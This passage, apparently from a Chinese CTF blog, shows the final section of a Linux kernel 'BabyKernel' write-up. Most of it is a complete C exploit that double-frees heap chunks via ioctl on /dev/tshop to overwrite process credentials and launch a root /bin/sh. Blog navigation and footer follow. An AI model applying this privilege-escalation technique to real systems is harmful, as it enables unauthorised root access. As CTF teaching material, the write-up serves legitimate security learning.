+<h3 id="Exploit-加固"><a href="#Exploit-加固" class="headerlink" title="Exploit 加固"></a>Exploit 加固</h3><p>由于panic的核心原因在于把 cred info 当作地址来申请堆块，那么在这个方向思考的话，其实可以通过一个free的写指针操作把 cred info 覆盖为一个有效的 chunk 地址，也就是free链表的尾 chunk 地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * main.c</span><br><span class="line"> * Copyright (C) 2019 hzshang &lt;hzshang15@gmail.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Distributed under terms of the MIT license.</span><br><span class="line"> */</span><br><span class="line">// gcc exp.c -o exp --static -lpthread</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MALLOC 0x271A</span><br><span class="line">#define FREE   0x2766</span><br><span class="line">#define EDIT1  0x1A0A</span><br><span class="line">#define EDIT2  0x22B8 </span><br><span class="line">pid_t pid;</span><br><span class="line"></span><br><span class="line">void debug()&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    ioctl(fd,MALLOC,1);</span><br><span class="line">    ioctl(fd,MALLOC,2);</span><br><span class="line">    ioctl(fd,MALLOC,3);</span><br><span class="line">    ioctl(fd,MALLOC,4);</span><br><span class="line">    ioctl(fd,MALLOC,5);</span><br><span class="line">    ioctl(fd,MALLOC,6);</span><br><span class="line">    ioctl(fd,MALLOC,7);</span><br><span class="line">    ioctl(fd,MALLOC,8);</span><br><span class="line">    ioctl(fd,MALLOC,9);</span><br><span class="line">    ioctl(fd,MALLOC,10);</span><br><span class="line">    ioctl(fd,MALLOC,11);</span><br><span class="line">    ioctl(fd,MALLOC,12);</span><br><span class="line">    ioctl(fd,MALLOC,13);</span><br><span class="line">    ioctl(fd,MALLOC,14);</span><br><span class="line">    ioctl(fd,MALLOC,15);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,MALLOC,16);</span><br><span class="line">    ioctl(fd,MALLOC,17);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line">    ioctl(fd,FREE,16);</span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line"></span><br><span class="line">    pid=fork();</span><br><span class="line"></span><br><span class="line">    if(pid==0)&#123;</span><br><span class="line">        sleep(1);</span><br><span class="line">        printf(&quot;[+] root&quot;);</span><br><span class="line">        system(&quot;whoami&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;[+] shell close&quot;);</span><br><span class="line">        ioctl(fd,FREE,17);</span><br><span class="line">        ioctl(fd,MALLOC,17);</span><br><span class="line"></span><br><span class="line">        ioctl(fd,MALLOC,16);</span><br><span class="line">        ioctl(fd,MALLOC,17);//cred==0 </span><br><span class="line"></span><br><span class="line">        ioctl(fd,FREE,0);</span><br><span class="line">        ioctl(fd,FREE,1);</span><br><span class="line">        ioctl(fd,FREE,2);</span><br><span class="line">        ioctl(fd,FREE,3);</span><br><span class="line">        ioctl(fd,FREE,4);</span><br><span class="line">        ioctl(fd,FREE,5);</span><br><span class="line">        ioctl(fd,FREE,6);</span><br><span class="line">        ioctl(fd,FREE,7);</span><br><span class="line">        ioctl(fd,FREE,8);</span><br><span class="line">        ioctl(fd,FREE,9);</span><br><span class="line">        ioctl(fd,FREE,10);</span><br><span class="line">        ioctl(fd,FREE,11);</span><br><span class="line">        ioctl(fd,FREE,12);</span><br><span class="line">        ioctl(fd,FREE,13);</span><br><span class="line">        ioctl(fd,FREE,14);</span><br><span class="line">        ioctl(fd,FREE,15);</span><br><span class="line">        sleep(100);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>主进程通过 UAF 再次把 chunk17 free 了一次，复写里面的Cred info 为 chunk16 的地址，然后再次申请堆块把链表恢复为原状态。同时在父进程中加了sleep函数提高稳定性。</p>
+<p>这时候已经得到了稳定的 root shell :)<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/9.png?raw=true" alt=""></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://p1umer.club">P1umer sauce</a>
+            <p>原文链接：<a href="http://p1umer.club/2019/05/14/KERNEL-Linux-Kernel-初探（一）BabyKernel/">http://p1umer.club/2019/05/14/KERNEL-Linux-Kernel-初探（一）BabyKernel/</a>
+            <p>发表日期：<a href="http://p1umer.club/2019/05/14/KERNEL-Linux-Kernel-初探（一）BabyKernel/">May 14th 2019, 2:46:55 am</a>
+            <p>更新日期：<a href="http://p1umer.club/2019/05/14/KERNEL-Linux-Kernel-初探（一）BabyKernel/">May 14th 2019, 2:52:39 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/05/06/Star-CTF-OOB-writeup/" title= "StarCTF OOB writeup">
+                    <div class="prevTitle">StarCTF OOB writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODMxMi8xNDg0MA==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:cz18811105578@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/mmqrcode1540290021396.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/cz11-96/activities" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#KERNEL-Linux-Kernel-初探（一）BabyKernel"><span class="toc-number">1.</span> <span class="toc-text">[KERNEL]  Linux Kernel 初探（一）BabyKernel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接"><span class="toc-number">1.2.</span> <span class="toc-text">相关链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.3.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试以及数据交互"><span class="toc-number">1.4.</span> <span class="toc-text">调试以及数据交互</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#程序启动以及调试"><span class="toc-number">1.4.1.</span> <span class="toc-text">程序启动以及调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP编写以及数据交互"><span class="toc-number">1.4.2.</span> <span class="toc-text">EXP编写以及数据交互</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#缓释机制"><span class="toc-number">1.5.</span> <span class="toc-text">缓释机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mmap-min-addr"><span class="toc-number">1.5.1.</span> <span class="toc-text">mmap_min_addr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kptr-restrict-dmesg-restrict"><span class="toc-number">1.5.2.</span> <span class="toc-text">kptr_restrict / dmesg_restrict</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMEP-SMAP"><span class="toc-number">1.5.3.</span> <span class="toc-text">SMEP/SMAP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析"><span class="toc-number">1.6.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.7.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-加固"><span class="toc-number">1.8.</span> <span class="toc-text">Exploit 加固</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 7
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2019/05/14/KERNEL-Linux-Kernel-初探（一）BabyKernel/" >[KERNEL] Linux Kernel 初探（一）BabyKernel</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/06</span><a class="archive-post-title" href= "/2019/05/06/Star-CTF-OOB-writeup/" >StarCTF OOB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2019/03/20/AFL-初探/" >AFL 初探（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2019/02/20/libfuzzer & LLVM 初探/" >libfuzzer & LLVM 初探</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/2018/09/03/IR's-Journey/" >IR's Journey</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/2018/07/10/V8-Iginition-Interpreter/" >V8 Iginition Interpreter</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2018/07/01/V8-Environmental-Configuration/" >V8 & Chrome Environmental Configuration</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="V8"><span class="iconfont-archer">&#xe606;</span>V8</span>
+    
+        <span class="sidebar-tag-name" data-tags="kernel"><span class="iconfont-archer">&#xe606;</span>kernel</span>
+    
+        <span class="sidebar-tag-name" data-tags="Browser Explore"><span class="iconfont-archer">&#xe606;</span>Browser Explore</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Browser-Explore"><span class="iconfont-archer">&#xe60a;</span>Browser-Explore</span>
+    
+        <span class="sidebar-category-name" data-categories="Browser-Explore/Edge"><span class="iconfont-archer">&#xe60a;</span>Browser-Explore/Edge</span>
+    
+        <span class="sidebar-category-name" data-categories="Browser-Explore/V8"><span class="iconfont-archer">&#xe60a;</span>Browser-Explore/V8</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "P1umer sauce"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
